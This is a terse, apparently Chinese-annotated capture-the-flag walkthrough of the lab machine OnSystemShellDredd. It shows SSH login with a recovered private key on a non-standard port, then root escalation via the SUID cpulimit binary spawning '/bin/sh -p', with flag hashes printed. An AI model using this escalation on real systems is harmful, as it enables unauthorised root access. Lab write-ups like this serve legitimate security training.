参考资料
   

[https://medium.com/@Inching-Towards-Intelligence/pg-play-onsystemshelldredd-78-100-1ed3cefd4b0c](https://medium.com/@Inching-Towards-Intelligence/pg-play-onsystemshelldredd-78-100-1ed3cefd4b0c)
         

192.168.212.130
   

──(kali㉿kali)-[~/Desktop/pg02/OnSystemShellDredd]  
└─$ chmod 600 id_rsa   ┌──(kali㉿kali)-[~/Desktop/pg02/OnSystemShellDredd]  
└─$ ssh hannah@192.168.212.130 -i id_rsa  
ssh: connect to host 192.168.212.130 port 22: Connection refused   ┌──(kali㉿kali)-[~/Desktop/pg02/OnSystemShellDredd]  
└─$ ssh hannah@192.168.212.130 -i id_rsa -p 6000  
ssh: connect to host 192.168.212.130 port 6000: Connection refused   ┌──(kali㉿kali)-[~/Desktop/pg02/OnSystemShellDredd]  
└─$ ssh hannah@192.168.212.130 -i id_rsa -p 61000  
The authenticity of host '[192.168.212.130]:61000 ([192.168.212.130]:61000)' can't be established.  
ED25519 key fingerprint is SHA256:6tx3ODoidGvtQl+T9gJivu3xnndw7PXje1XLn+lZuSM.  
This key is not known by any other names.  
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes  
Warning: Permanently added '[192.168.212.130]:61000' (ED25519) to the list of known hosts.  
Linux ShellDredd 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64  
The programs included with the Debian GNU/Linux system are free software;  
the exact distribution terms for each program are described in the  
individual files in /usr/share/doc/*/copyright.
 
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent  
permitted by applicable law.  
hannah@ShellDredd:~$
   

[https://gtfobins.github.io/gtfobins/cpulimit/](https://gtfobins.github.io/gtfobins/cpulimit/)
      

diyige  
hannah@ShellDredd:~$ cat local.txt  
02290c3b5d0d8d231b2fff0c6053e31e  
hannah@ShellDredd:~$
   

local.txt user.txt  
hannah@ShellDredd:~$ cat local.txt  
02290c3b5d0d8d231b2fff0c6053e31e  
hannah@ShellDredd:~$ cd /usr/bin  
hannah@ShellDredd:/usr/bin$ ./cpulimit -l 100 -f -- /bin/sh -p  
Process 1082 detected  
# id  
uid=1000(hannah) gid=1000(hannah) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),1000(hannah)  
# whoami  
root  
# cd /root  
# ls  
proof.txt root.txt  
# cat proof.txt  
78d683eddca4000d4057756ef3a5bcab  
#